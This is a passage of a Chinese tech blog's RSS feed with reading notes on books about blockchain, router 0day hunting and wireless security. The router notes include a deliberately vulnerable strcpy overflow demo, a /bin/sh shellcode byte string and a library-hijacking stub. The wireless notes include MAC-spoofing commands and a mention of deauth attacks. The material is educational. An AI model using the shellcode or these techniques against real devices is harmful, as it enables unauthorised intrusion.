Filter)</li></ul><p>布隆过滤器是一种基于Hash的高效的查找结构。可以在<strong>常数时间内</strong>回答”某个元素是否在一个集合内”。</p><p>布隆过滤器是一种基于hash查找的优化，</p><p>Hash查找：Hash的本身可以使得任何输入得到一个定长的输出，所以，我们可以分配一个内容的数组，使得我们的Hash的函数的值不超过数组大小，，这样就可以实现快速的信息索引。</p><p>比如，H(“hallo”) == 100, 那么我们就把它放在 数组的索引为100的地方。这样的话查找任何内容，只需要进行一次hash就可以找到。</p><p>不过，问题存在时，如果我们的Hash的范围过大，那么就需要大量的内存分配，导致利用率太低。可是如果 Hash的输出范围过小，就很容易发生碰撞(collision)。所以在这两方面的制约下，就演化出了<strong>布隆过滤器</strong>。</p><p>在 <strong>布隆过滤器</strong> 采用了多个Hash函数，得到了多组结果，从而提高对空间利用率。在这多个地址上把值置1，如果我们输入新的数据，存在着多个对应地址都是1，说明有较大几率是该记录。</p><p>所以布隆过滤器在提高空间利用率的前提下，降低了hash 碰撞率(重复率)。</p><hr><ul><li>同态加密</li></ul><p>这个是区块链目前的一个发展方向，因为同态加密技术，可以很好的适用于解决链上数据透明的情况。</p><p>同态加密(Homomorphic Encryption),<strong>允许对密文进行处理得到的依然是加密的结果</strong>，从抽象代数的角度讲，是保持了 <strong>同态性</strong></p><blockquote><p><strong>密文直接处理，根明文进行处理之再加密，得到的结果相同。</strong></p></blockquote><pre><code>En(X*P(Y)) = En(X)*P(E(Y))</code></pre><p>上面的P就是同态加密的过程。</p><p>。。。 略去部分内容</p><p>目前，已知的同态加密的技术往往需要较高的计算时间或者存储空间。相信，不远的将来，会有革命。</p><h2 id="比特币"><a href="#比特币" class="headerlink" title="比特币"></a>比特币</h2><ul><li><p>2008/10/31 中本聪<strong>(Satoshi Nakamoto)</strong>发布<span class="exturl" data-url="aHR0cDovL3d3dy44YnRjLmNvbS93aWtpL2JpdGNvaW4tYS1wZWVyLXRvLXBlZXItZWxlY3Ryb25pYy1jYXNoLXN5c3RlbQ==" title="http://www.8btc.com/wiki/bitcoin-a-peer-to-peer-electronic-cash-system">比特币白皮书<i class="fa fa-external-link"></i></span> </p></li><li><p>2009/1/3 18:15:05 比特币的创世纪</p></li></ul><hr><p>基本的交易流程，基于UTXO(Unspent Transaction Outputs)的模型，每个解一包含一些输入输出，未经使用的交易输出可以被新的交易引用作为合法输入，被使用过的交易的输出则无法被引用为合法输入。</p><p>最小的转账单位是 <strong>0.0001BTC</strong> 最小的交易单位是 0.00000001BTC (即 1聪 )</p><p><strong>比特币的账户地址</strong> 实际上非对称加密中的公钥，进行一系列的 Hash 即编码生成的 160位 20字节的的字符串。一般的，对账户的地址串进行 Base58Check 编码，被添加<strong>前导字节</strong>(<strong>说明支持哪种脚本</strong>)和4字节的校验字节。</p><p><strong>比特币交易脚本</strong> 每个交易会有输出脚本(scriptPubKey)和认领脚本(scriptSig)。<strong>输出脚本</strong>用于对收款方对该笔输入的使用限制。<strong>认领脚本</strong> 是证明自己可以满足仅以输出脚本的锁定条件。</p><p>这篇文章的后部，有关于区块的部分简介</p><blockquote><p><span class="exturl" data-url="aHR0cDovL2Jsb2cuZGlnbHAueHl6LzIwMTgvMDMvMTIvcHlNeUJDXzMv" title="http://blog.diglp.xyz/2018/03/12/pyMyBC_3/">Py区块链源码笔记<i class="fa fa-external-link"></i></span></p></blockquote><p>由于区链的性质，对区块链进行完整性的校验是很容易，只需要校验每个区块的区块头信息，不需要得到内容，这个是<strong>简单交易认证(Simple Payment Verification SPV)</strong>的基本原理。</p><hr><ul><li>BTC 的设计创意</li></ul><p><strong>避免作恶</strong> 使用了经济博弈论的思想来避免作恶，我们无法确保每个人都是合作的。但是我们可以通过经济博弈使得合作者得到利益，让非合作者遭受损失和风险。 在比特币网络中，每个参与网络的(矿工)都要付出挖矿的成本代价，进行计算能力的消耗，在概率角度，越想拿到新区块的记账权，则付出的算力也会越多。一旦是一次失败的争夺，那么付出的算力讲是被没收掉。所以意味着一次作恶所需要的成本可能远远高于所带来的收益。</p><p><strong>负反馈调节</strong> 在比特币网络上很好的使用了负反馈控制论基础原理。网络中的矿工越多，系统越稳定，比特币的价格也越高，但是也更难得到区块奖励。所以比特币的价格应该会稳定在一个合适的值，使得出产量和价格的积符合矿工的预期。(具体的区块链网络会进行自己的难度调节)</p><p><strong>共识机制</strong> 传统共识机制往往考虑是一个相对封闭的分布式系统中，允许存在故障节点，也能达成共识。但是对比特币网络来讲，这个是高度开放性的，人人可接入，所以面临的问题会更加的复杂，那么传统的共识算法可能会无法使用。</p><p>所以，比特币网络对共识的目标进行了进一步的限制，提出了基于 <strong>PoW</strong> 的共识机制。这种机制，不是面向最终的确认共识，而是<strong>基于概率，随时间逐步加强确认的</strong>共识。现有的共识在理论上是可能被推翻，但是随着时间的演进，攻击者所付出的代价会随着时间指数上升，被推翻的可能性也随指数下降。</p><p>此外，由于Internet的尺度之大，所以按照区块为单位进行确认(快照)，从而提高网络整体的可用性。此外，限制网络中的共识噪声。<strong>通过大量的Hash和少数的合法性结果来限制合法提案的个数</strong> 可以进一步提高稳定性。</p><hr><ul><li>挖矿 。。。</li></ul><p>这部分采用Keyword</p><ul><li>四年一减产</li><li>十分钟一区块，难度自动调整(两周)</li><li>避免震荡，每次难度最多是4倍</li><li>历史上最快出块10S，最慢1H</li></ul><p>看见我们的 Satoshi 先生真的考虑到了太多太多的因素！</p><blockquote><p>比特币的区块链(通过挖矿)提供了一个局部的，迄今为止最优的解决方案:如何在分散的系统中验证信任。</p><p><strong>所以，意味着，区块链系统，本质上解决了传统的依赖于第三方的问题。因为这个协议不只满足了中心化机构追踪交易的需求，还使得陌生人之间产生信任。区块链技术和安全的过程使得陌生人之间在没有被信任的第三方时产生信任</strong></p></blockquote><p>在当前所由的其他的证明机制(PoW,PoS,PoA…)，这些证明机制都无法解决所有的问题，在原作者提出的，一种可能是 <strong>以入随机代理人制度</strong> ，通过算法在某段时间确保只是让部分的节点参加共识的提案，并且发放一部分的奖励给所有在线贡献的节点。</p><hr><ul><li>共识机制</li></ul><p><strong>工作量证明</strong> 在大量的Hash下只有少数的合法提案。可得合法提案者需要付出工作量。</p><p>少数的合法提案会在网络上进行广播，用户收到广播后，停止当前计算，立马开始在新的最长链的基础上进行计算。由于网络尺度大，所以可能出现分叉(Fork)现象，但是最终会是一条最长链。</p><p><strong>权益证明</strong> PoS 这个是在2013年提出，在peercoin 中实现，类似于现在的股东机制，用于越多的股份(币)的人越容易获得记账的权力。</p><p>典型的过程是，通过保证金，来对赌一个合法的块称为一个新的区块。虽说这种机制试图解决PoW中的资源浪费的问题，不过实际上，这种机制导致的结果是<strong>屯币</strong>,一样的回事流通的量减少。</p><hr><ul><li><strong>闪电网络</strong> </li></ul><p>在BTC的网络环境下，最为诟病的是其交易性能，现在的全网只有 7TPS(Transcation Per Second)这样的吞吐量，显然远低于现代需求，而且， 6min/block的块确认速度，导致完全可信交易需要等待1H以上(6个确认)。所以为了提高速度，社区提出了<strong>闪电网络(Lighting Network)</strong>,其思路是 <strong>把大量交易放在链外进行，只把关键环节放在链上</strong></p><p><strong>BTC区块链的机制自身提高了极高的可信保证，但是相对较慢。那么，我们的大量的小额交易是否需要如此之高的可信</strong>。这个可能就是闪电网络的思想起源</p><p>所以现在的闪电网络主要是通过引入智能合约的思想来完成链下的交易渠道。核心概念由两个 </p><ul><li>RSMC (Recoverable Sequence Maturity Contract) 可撤销的顺序成熟合同</li><li>HTLC (Hashed TimeLock Contract) 哈希的带时钟的合约</li></ul><p><strong>RSMC</strong> 这个中文是麻烦，不过作者在书中讲解的是，实际上原理很简单，类似于一个资金池机制。</p><p>假定双方之间存在一个 “微支付通道”(资金池)。双方都进行一些金额的预存，每次进行支付时，即双方进行签名认证，只是<strong>在池内进行资金份额的分配</strong>，当需要进行提现的时候，才需要把资金池的分配情况写回区块链，所以这个主要的过程(资金池)完全可以在链下实现。</p><p><strong>HTLC</strong> 实际上可以称作，限时转账。通过智能合约，双方约定先对转账方一笔钱进行冻结，并且提供一个Hash,如果在一定的时间里，有人可以提出一个字符串使得，其哈希之后和已知的哈希值匹配(<strong>实际上意味着，转账方授权了接收方对该冻结金额进行提现</strong>)，之后这笔钱才真正的给了接收方(reciper)</p><p><strong>综上</strong> ：在闪电网络中，RSMC 保证了两个人的交易可以在链下完成，HTLC 保证了任意两人之间可以通过虚拟通道进行链下的支付。</p><hr><ul><li><strong>侧链</strong></li></ul><p>这个是个蛮重要的功能，自己之前没有理解。侧链就是以比特币为主链(Parent Chain)，其他的区块链为侧链，二者通过<strong>双向挂钩(Two-Way Peg)</strong>,实现了比特币可以到侧链中进行流通。</p><p>侧链是一个独立的链，可以有自己的账本，共识机制，交易类型，等等。侧链不能发行BTC，不过可以通过从主链，取引入一定数量的BTC，在侧链中流通，侧链流通中的比特币，在主链上时会被锁定，直到侧链的币回到主链之中。</p><p>侧链的机制，可以将一些定制化或者高频的交易放在主链之外进行，<strong>实现了BTC的区块链拓展性</strong>。</p><ul><li>SPV 证明</li></ul><p>在比特币的区块链中，交易的合法性，是通过UTXO实现的。但是很多时候，用户只是关心，自己的相关的那些交易，而不需要对一个UTXO的交易链进行校验。这里就是<strong>中本聪</strong>先生设计的 ： SPV(Simplified Payment Verification) 的机制.简单支付验证，可以通过较小的代价判断某个交易是否已经被区块链所确认，以及得到多少有效算力的保护(多少确认)。</p><p>SPV 客户端只需要下载所有的区块的区块头。进行SPV证明 ： 一组区块头的列表，表示工作量证明；一个特定输出确实存在某个区块的密码学证明。</p><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><ul><li>区块容量：更大的容量，由更高的吞吐性能，但是增加挖矿成本，由中心化的风险，和更大的存储空间的需求。</li><li>出块时间的间隔：这样回事确如时间缩短，但是增加了分叉的可能</li><li>脚本支持</li></ul><p><strong>交易延展性(Transaction Malleability)</strong> 是比特币的一个设计缺陷。在交易发起者对交易签名后，交易的ID仍然有可能改变。</p><p>扩容圣战: <strong>隔离见证(Segregated Witness)</strong></p><h2 id="以太坊"><a href="#以太坊" class="headerlink" title="以太坊"></a>以太坊</h2><p>Ethereum,2015/7 主网运行。</p><p>采用了账户模型，为每一个地址有一个世界变量</p><p>开发库：</p><ul><li>go-etheremu</li><li>Parity</li><li>cpp-ethereum</li><li>ethereumjs-lib</li><li>EthereumJ</li><li>ethereumH</li><li>pyethapp</li><li>ruby-ethereum</li></ul><p>关于以太坊的简介即教程之前是有的，所以这部分由于文中没有就其特点做深入的探讨，主要篇幅在与智能合约应用，所以这部略去。</p><h3 id="HyperLedger"><a href="#HyperLedger" class="headerlink" title="HyperLedger"></a>HyperLedger</h3><p>超级账本是linux基金会下面的一个杀手级的项目。向作为自己学习的一个重点方向，此书的后半部分，主要针对其应用和部署做了大量的讲解，所以，为了定位明显，后面将会以超级账本的转向进行学习。</p><p>故此处略去大量内容</p><h2 id="后"><a href="#后" class="headerlink" title="后"></a>后</h2><p>这本书，由浅至深的讲解了区块链体现设计的方方面面，真的可谓是从出色到卓越。通过此书，也是补习了很多基础知识，和新的概念，作为一个入门书籍，十分不错。夜深，睡。</p><p>2018/5/1 3:43:45 </p>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2018/05/01/BC_Book_%E5%8C%BA%E5%9D%97%E9%93%BE%E5%8E%9F%E7%90%86%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%BA%94%E7%94%A8/#disqus_thread</comments>
    </item>
    
    <item>
      <title>读本好书 《揭秘家用路由器0Day挖掘技术》</title>
      <link>https://www.diglp.xyz/2018/04/27/Book_%E8%B7%AF%E7%94%B10Day/</link>
      <guid>https://www.diglp.xyz/2018/04/27/Book_%E8%B7%AF%E7%94%B10Day/</guid>
      <pubDate>Thu, 26 Apr 2018 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;前&quot;&gt;&lt;a href=&quot;#前&quot; class=&quot;headerlink&quot; title=&quot;前&quot;&gt;&lt;/a&gt;前&lt;/h2&gt;&lt;p&gt;我想未来对安全方面的需求会越来越大，随着这个体系的越发庞大，其潜在的安全威胁，可能愈发的丰富。&lt;/p&gt;
&lt;h2 id=&quot;简介&quot;&gt;&lt;a
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><p>我想未来对安全方面的需求会越来越大，随着这个体系的越发庞大，其潜在的安全威胁，可能愈发的丰富。</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li>书名：揭秘家用路由器0Day挖掘技术</li><li>作者：吴少华</li><li>ISBN：9787121263927</li></ul><p>硬件安全，将会随着物联网的兴起得到苏醒，而且变得更加的多元化</p><p>本书分为 三个部分</p><ul><li>基础知识</li><li>原理与应用</li><li>分析与利用</li></ul><p>同样这里对内容，所学做极简要总结。</p><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>路由器漏洞分类：</p><ul><li>密码破解漏洞 WPA/WPS/WEP</li><li>WEB漏洞 SQL注入/远程命令执行/跨站脚本</li><li>特定后面 调试端口/admin</li><li>溢出漏洞 这个算是系统级别的</li></ul><p>路由的web安全和服务器web安全类似。</p><hr><p>常见的路由器其处理器结构基本是都是 <strong>MIPS</strong> 运行精简 <strong>LINUX</strong> ， 主要的基本 shell 功能由 <strong>BusyBox</strong> 实现</p><pre><code>busybox ls -lbusybox cd...</code></pre><p>路由器中的<code>ls</code>等基本命令由busyBox的链接实现。</p><hr><ul><li>GNU 工具集</li></ul><p>GCC 常用功能，不做展开。 <strong>GDB</strong> 作为主要调试器 命令常用需要掌握</p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuYmFpZHUuY29tL2xpbms/dXJsPVNGRXZwUWZiOUlDWldJaEg0ZldKOVd6UmZteERlUEhoQ0pNQzZCd0NybEJ0cUtPN2tNaWVvMkJSVkpKaWY3ZXJoUVFfaDhtdDQ5d240RGt4bDE0RGNLJmFtcDt3ZD0mYW1wO2VxaWQ9YWMyOWIyYTEwMDAxOWQwODAwMDAwMDA2NWFlMTgzMjM=" title="https://www.baidu.com/link?url=SFEvpQfb9ICZWIhH4fWJ9WzRfmxDePHhCJMC6BwCrlBtqKO7kMieo2BRVJJif7erhQQ_h8mt49wn4Dkxl14DcK&amp;wd=&amp;eqid=ac29b2a100019d08000000065ae18323">GDB十分钟教程<i class="fa fa-external-link"></i></span></p></blockquote><p>值得注意的是，在使用GDB调试之前，elf文件需要包含调试信息</p><pre><code>gcc -ggdb main.c</code></pre><hr><ul><li>MIPS汇编及体系</li></ul><p>（感觉除了X86汇编，其他的都十分奇怪。。。）</p><p>一个<strong>32</strong>个寄存器，特殊的是 $0 寄存器，的值总是零，提供需要用到0的地方。29 = sp，30 = fm，31 = ra （返回）</p><p>MIPS是大端序(BIG_endian)，和网络字节序相同</p><blockquote><p><strong>高在高位是小端，高在低位是大端</strong></p></blockquote><pre><code>{num[n],num[n+1],num[n+2],num[n+3]}    #MSB    (Most Significant Byte){num[n+3],num[n+2],num[n+1],num[n]}    #LSB    (Least Significant Byte)</code></pre><blockquote><p>“大端”和“小端”可以追溯到1726年的Jonathan Swift的《格列佛游记》，其中一篇讲到有两个国家因为吃鸡蛋究竟是先打破较大的一端还是先打破较小的一端而争执不休，甚至爆发了战争。</p></blockquote><hr><ul><li>HTTP协议</li></ul><p>路由器的很多漏洞是存在于 Web服务器没有正确的仅需攻击者所发送的HTTP请求。</p><p><strong>HTTP请求行</strong></p><pre><code>[Method] [Request-URI] [HTTP-Version] [CRLF] eg: GET /from.html HTTP/1.1 (CRLF)</code></pre><blockquote><p>(CRLF是Carriage-Return Line-Feed的缩写，意思是回车换行，就是回车(CR, ASCII 13, \r) 换行(LF, ASCII 10, \n))</p></blockquote><p>这里规定，必须是以 <strong>CRLF</strong> 结尾，不允许出现单独 <strong>CR(回车)/LF(换行)</strong>,<strong>“\r\n”</strong>,<strong>“\x0D\x0A”</strong>。</p><p>（之前一个Qt用socket实现的http请求，不能得到正确GET的Respond 的原因）</p><p>Method 有很多种 GET/POST/HEAD/PUT/DELETE/TRACE/CONNECT/OPTIONS.</p><p>POST克服了GET方法的一些缺点。因为通过Post进行表单数据的提交的时候，数据本身不是URL请求的一部分，而是作为标准数据传送给服务器，这点克服了GET进行数据传递的时候信息无法加密和提交数据量太小的缺点。</p><p><strong>HTTP报头</strong></p><ul><li>Accept:    表示希望接收的资源类型<br>   Accept-Encoding:    表示内容编码<br>   Cookies:    表示客户端向服务器进行Cookies认证的信息<br>   Accept-Encoding:    指定一种自然语言</li><li><strong>Host:主机及其端口号，默认80，通常从URL中得到</strong><br>   User-Agent：    用户代理，实际上包含着用户的部分信息，系统，浏览器内核等等</li></ul><p>请求头示例：</p><pre><code>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Cache-Control: max-age=0Connection: keep-aliveCookie: BAIDUID=5E1B56CB86750A3F365EDFC9FA1DA1A9:FG=1; BIDUPSID=E3A36946B81579878C6378864B750C4A; PSTM=1512745351; Hm_lvt_55b574651fcae74b0a9f1cf9c8d7c93a=1524673678,1524718817,1524727227,1524729701; Hm_lpvt_55b574651fcae74b0a9f1cf9c8d7c93a=1524729701; H_PS_PSSID=1420_21106; BDRCVFR[gltLrB7qNCt]=mk3SLVN4HKm; PSINO=7; pgv_pvi=3976877056; pgv_si=s5736833024DNT: 1Host: baike.baidu.com</code></pre><hr><ul><li>软件工具</li></ul><p>主要是虚拟机，IDA，BinWalk，QEMU。这些工具。</p><p>前两种不多做介绍了，虚拟机，和静态反编译工具。</p><p>BinWalk，主要用于对于固件包的自动化解包和分析，可以对目标架构，和目录结构，内核版本等等的信息进行自动分析。</p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMTA4NDI4MzE3Mi9hcnRpY2xlL2RldGFpbHMvNjY5NzEyNDI=" title="https://blog.csdn.net/qq1084283172/article/details/66971242">BinWalk的使用<i class="fa fa-external-link"></i></span></p></blockquote><p>QEMU 和 Bochs 类似是一个处理器模拟软件，在环境中，我们配合MIPS的交叉编译工具，可以实现一个本机模拟的MIPS的机器平台，方便我们进行各种测试。</p><hr><ul><li>路由0day基本挖掘方法</li></ul><p>对路由0day挖掘的初步方法大致以下</p><ul><li>固件分析 使用BinWalk对固件进行解包，提取其中的关键文件进行分析。</li><li><p><strong>动态运行库的劫持</strong></p><p>  对于一些关键的so(Sharded Object) 的里面的函数进行重写，即保留同样的函数符号，使用我们自己的函数内容实现一个新的so文件，并且替换源文件。</p><pre><code>#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int apmib_init(void){    //Fake it    return 1;}$ mips-linux-gcc -fPIC -shared apmib.c -o apmib-ld.so</code></pre><p>  实际上的过程，涉及到对so文件的静态分析，通过IDA对器进行逆向分析，在保留器原有函数的基础上，对部分的符号代码进行修改。</p></li></ul><h2 id="路由器安全"><a href="#路由器安全" class="headerlink" title="路由器安全"></a>路由器安全</h2><ul><li>web部分</li></ul><p>该书的这部分很简略，篇幅在几页，主要讲了有 <strong>XSS</strong> 和 <strong>CSRF</strong>。</p><p>XSS(Cross Site Scipting)，防止和 CSS(Cascading Style Sheets) 起名为 XSS。具体就是恶意的JS脚本插入，分为反射型和存储型。前者是主动触发，我们可以找到XSS点，构造反射链接，发送给受害者，存储型，常见的就是留言板。233</p><p>CSRF(Cross-Site Request Forgery) 是一种对网页的恶意利用。和XSS有着十分大的差别。其实际上不是通过插入的JS实现功能，实际上是对网页原文进行劫持之后进行的修改，最终实现了自己的代码会在目标主机执行。</p><ul><li>路由器后门<br>这种漏洞出现于官方的预留的端口，或者其他的超级密码。</li></ul><hr><ul><li>路由器溢出漏洞</li></ul><p>溢出漏洞是一个相当高危而且普遍的漏洞。</p><p><strong>栈溢出</strong></p><blockquote><p>在计算机科学中，栈是一种先进后出得(FILO)队列的数据结构。调用栈(Call Stack)是值存放在一个正在运行的函数的信息栈。调用栈本身又是由栈帧(Stack Frame)构成，每个栈帧对应一个未完成函数。</p><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vMzNkZWJ1Zy9wLzY3NzMwNTkuaHRtbA==" title="https://www.cnblogs.com/33debug/p/6773059.html">函数的调用过程(栈帧)<i class="fa fa-external-link"></i></span></p></blockquote><p>在MIPS架构中，参数传递使用 $a1~$a4 着四个寄存器，（$a0是零值寄存器），所以我们的参数超过5个之后就会使用到了栈，进而进行第五个参数的传递。</p><p>MIPS中的溢出可行性:X86的架构不同， x86的调用过程，是发生函数调用时，把当前的函数地址压入栈中，在函数返回时直接进行弹栈，从而返回原函数的地址空间，但是在MIPS的架构下，函数调用时<strong>不会把原函数地址压栈</strong> 而是直接存入寄存器 <strong>$ra(返回地址寄存器)</strong>。下面时书中的溢出可行性分析：</p><p>在MIPS的架构中，有着 <strong>叶子函数和非叶子函数</strong> （这里竟然是查无此词，应该是作者自己的词）。</p><blockquote><p>个人理解讲:叶子函数这个词的叶子可以取于树结构，叶子说明函数体内没有调用其它的函数，也就是没有后继节点。非叶反之.</p></blockquote><p><strong>非叶子函数</strong>的情况:由于<strong>$ra</strong>寄存器只存在一个,所以实际上,如果是非叶子函数了,子函数体内部再次发生 Call 这样的话,会发生,把上一个函数的地址压栈,把调用函数的地址存入 <strong>$ra</strong> </p><p>所以和经典的溢出思路相同,还是覆盖掉压入栈中的返回地址.</p><p><strong>叶子函数</strong>情况:作为叶子函数,其没有后继的函数Call 所以,返回地址是保存在 <strong>$ra</strong> 中的,所以我们无法通过经典的思路进行覆盖(这个是寄存器了),不过也是存在利用可能,我们使用足够大的数据,覆盖掉上层函数的返回地址.(<strong>上层调用了我,上层一定时非叶子对吧</strong>)</p><p><strong>缓冲区溢出</strong><br>在缓冲区分配,和使用过程中的问题,比如对所缓冲数据没有做检测,导致其对栈内数据发生了覆盖</p><p>一般实现功能:拒绝服务,获得用户级权限,获得系统级权限(提权).</p><pre><code>#include &lt;stdio.h&gt;  #define PASSWORD &quot;1234567&quot;  int verify_password (char *password)  {     int authenticated;     char buffer[8]; // add local buffto be overflowed     authenticated=strcmp(password,PASSWORD);     strcpy(buffer,password); // over flowed here!     return authenticated;  }  main()  {     int valid_flag=0;     char password[1024];     while(1)     {        printf(&quot;please input password: &quot;);        scanf(&quot;%s&quot;, password);        valid_flag=verify_password(password);        if(valid_flag)        {           printf(&quot;incorrect password!\n\n&quot;);        }        else        {           printf(&quot;Congratulation! You have passed the verification!\n&quot;);           break;        }     }  } </code></pre><p>这里贴上一段简单代码,注释已经标明了溢出点,在;进行Cpy的时候,没有进行长度检测.</p><p>我们知道,局部变量是依次在栈中分配空间的,所以我们分配的8个字节的数组紧邻的就是 int . 这里我们可以实现的是</p><p><img src="https://upload-images.jianshu.io/upload_images/2897833-ec918cbd4442e4c4.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/453" alt=""></p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC9iNTc0ZDY2NzhjNGY=" title="https://www.jianshu.com/p/b574d6678c4f">图片来自<i class="fa fa-external-link"></i></span></p></blockquote><ol><li>通过对 buffer的溢出,从而覆盖 那个int的值</li><li>覆盖返回地址(这一点就是无限的空间了)<strong>SHELLCODE</strong></li></ol><hr><ul><li>ShellCode</li></ul><p>可以使用覆盖返回地址之后.我们就可以让当前函数返回到我们希望的地方了.</p><p>这个地方,就可以是我们构造的ShelCode.</p><pre><code>char shellcode[] =&quot;\x55\x8b\xec\x51\x51\x83\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89&quot;&quot;\xf3\x8d\x4e\x08\x31\xd2\xcd\x80\xe8\xe4\xff\xff\xff\x2f\x62\x69\x6e&quot;&quot;\x2f\x73\x68\x58&quot;;   //...VOID Sub_2(){    ((void(WINAPI*)(void))&amp;ShellCode)();}</code></pre><p>这里具体来又是一本书了…</p><hr><ul><li>文件系统提取</li></ul><p>固件的提取思路主要是找到一个文件的签名头,这样才可以识别出到底是什么文件,比如我们常用的<code>file</code></p><ol><li><strong>strings|grep</strong>    全文检索文件系统的 magic 签名头<br> . <strong>hexdump|grep</strong>    检索 magic 签名偏移<br> . <strong>dd|file</strong>         确定migic签名偏移处的文件系统格式</li></ol><p>eg: cramfs 的magic的签名是 0x28cd3d45,squashfs 有 sqsh,hsqs…</p><pre><code>string firmware.bin | grep `python -c &apos;print &quot;\x28\xcd\x3d\x45&quot;&apos;`string firmware.bin | grep `python -c &apos;print &quot;\x45\x3d\xcd\x28&quot;&apos;`</code></pre><p>这里对整个文件的字符串进行检索找到有没有符合 cramfs 的签名,这里之所以会寻找两次,是为了保证,大端和小端的两种情况.找到特征签名之后,我们就开始定位文件偏移</p><pre><code>hexdump -C firmware.bin | grep -n &apos;hsqs&apos;</code></pre><p>这里找到特征字符串的偏移.之后我们可以使用 DD 对文件进行提取</p><pre><code>dd if=firmware.bin bs=1 count=100 skip=1441936 of=squash.bin</code></pre><p>这里就是使用dd对文件进行偏移的提取了.</p><p><strong>自动提取大法 BinWalk</strong></p><hr><ul><li>应用 </li></ul><p>后面的部分针对漏洞的实际应用做了总结,慢慢的学习其中的过程</p><h2 id="后"><a href="#后" class="headerlink" title="后"></a>后</h2><p>实际上,关于硬件安全的分析,在这本书里所讲解的大部分是出自软件的二进制安全.其实更渴望一本,是在硬件层级去分析一个设备安全的书.不过这本书,也是巩固了不少相关的知识.</p>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2018/04/27/Book_%E8%B7%AF%E7%94%B10Day/#disqus_thread</comments>
    </item>
    
    <item>
      <title>读本好书《黑客大曝光——无线网络安全》</title>
      <link>https://www.diglp.xyz/2018/04/25/Book_%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8/</link>
      <guid>https://www.diglp.xyz/2018/04/25/Book_%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8/</guid>
      <pubDate>Tue, 24 Apr 2018 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;前&quot;&gt;&lt;a href=&quot;#前&quot; class=&quot;headerlink&quot; title=&quot;前&quot;&gt;&lt;/a&gt;前&lt;/h2&gt;&lt;p&gt;这本书其实早都有开始看了，只是时间太过于碎片化了，规格也在 500p，这里只是对书中的内容做极简要的总结。&lt;/p&gt;
&lt;h2 id=&quot;简介&quot;&gt;&lt;a
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><p>这本书其实早都有开始看了，只是时间太过于碎片化了，规格也在 500p，这里只是对书中的内容做极简要的总结。</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li>书名：黑客大曝光——无线网络安全</li><li>作者：Joshua Wright/Johnny Cache</li><li>ISBN：9787111526292</li></ul><p>对目前的无线安全领域的一个很广泛的描述。从 wifi 到 蓝牙，再到其他的安全，像是移动数据 和 Zigbee</p><h2 id="Wifi部分"><a href="#Wifi部分" class="headerlink" title="Wifi部分"></a>Wifi部分</h2><hr><ul><li>802.11协议安全</li></ul><p>这里是Airodump/AirCrack-NG 之类的工具，可能对802.11协议中的漏洞的利用。有 <strong>解除认证攻击</strong> (Deauth) ,这里可以使用 CommView 自带的工具既可以实现一次接触认证攻击</p><blockquote><p><span class="exturl" data-url="aHR0cDovL3d3dy4zNjBkb2MuY29tL2NvbnRlbnQvMTYvMDQxNi8xOC8yOTM0NjQ3M181NTExNjMxNTYuc2h0bWw=" title="http://www.360doc.com/content/16/0416/18/29346473_551163156.shtml">解除认证攻击( Deauth )的原理<i class="fa fa-external-link"></i></span></p></blockquote><p>在每个硬件中都有其对应的MAC地址，这个mac的设计本想用来对不同的设备进行区分，结果没有考虑到，含有mac的数据是通过软件发出来的。所以 <strong>MAC修改</strong> 也是一个利用用的地方</p><pre><code>LINUX:    ifconfig wlan0 down    ifconfig wlan0 hw ether 00:11:22:33:44:55    ifconfig wlan0 upOSx:    airport -z    ifconfig en0 ether 00:11:22:33:44:55</code></pre><ul><li>无线加密安全</li></ul><p>常见的加密方式 <code>WEP</code>(有限对等保密) 和 <code>WAP</code> (Wi-Fi网络安全接入).</p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS9XRVAvNjEyMTUx" title="https://baike.baidu.com/item/WEP/612151">WEP<i class="fa fa-external-link"></i></span> (Wired Equivalent Privacy)</p><p><span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS9XUEEvMzM0Njc=" title="https://baike.baidu.com/item/WPA/33467">WPA <i class="fa fa-external-link"></i></span> (Wi-Fi Protected Access)</p></blockquote><p>前者已经被证明有重大的安全漏洞，已经于本世纪初期停用。对于WEP加密讲，只有有持续的连接，我们可以嗅探到足够的IV(Initial Vector)破解概率是100%。使用工具可是wifite/aircrack-ng， 具体细节网上有大量资源</p><p>AP 和 Client在连接之前是两个并不相关的个体，其中如果需要进行连接，那么必须是需要有个协商密钥的过程。</p><p>在非安全信道进行加密通信，这个很容易使我们相到，非对称加密体系。比如我们极为常用的RSA，不过这里就出现了一个问题，公钥的认知，通俗讲，我怎么知道，你是不是他？ 我们常见的体系中的，会有CA/RA这种角色，进行对证书的验证和颁发。可是在我们的WIFI连接过程中是没办法再介入第三方的。</p><p>所以，综上我们的密钥协商过程是存在被嗅探的风险。</p><p><span class="exturl" 